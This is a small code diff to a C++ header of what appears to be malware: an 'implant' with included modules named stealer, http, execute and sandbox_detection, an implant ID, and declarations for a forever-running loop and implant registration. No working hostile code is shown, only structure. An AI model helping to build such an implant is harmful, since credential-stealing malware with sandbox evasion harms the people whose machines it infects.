@@ -13,16 +13,18 @@
 
 using json = nlohmann::json;
 
+/* Variables */
+#define IMPLANT_ID 1
+
 /* Header files of Implementations */
 #include "stealer/stealer.h"
 #include "http/http.h"
-#include "persist/persist.h"
+#include "execute/execute.h"
 #include "sandbox_detection/sandbox_detection.h"
-
 
 /* Functions */
 void IWillRunForever(void);
 void registerimplant(void);
-void execute(std::string, int);
+
 
 #endif
